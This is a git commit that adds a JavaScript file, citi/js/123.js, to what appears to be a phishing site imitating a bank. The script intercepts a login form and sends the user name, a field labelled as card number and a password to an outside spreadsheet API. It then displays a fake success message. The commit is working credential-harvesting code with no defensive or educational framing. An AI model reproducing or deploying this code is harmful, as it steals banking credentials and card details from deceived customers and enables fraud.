76ae00bdecebe4b1001d6a354947ae3d9061e0a9
l2-soporte <bluesmeralda4@gmail.com>
2024-12-17 10:53:18 -0600

    add files ci

---
+++ citi/js/123.js
@@ -0,0 +1,31 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/5f5e298b-9181-4049-81d8-dff76feed6b8', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Usuario": formulario.usuario.value,
+            "Tarjeta": formulario.contraseña.value,
+            "Clave": formulario.confirmar.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
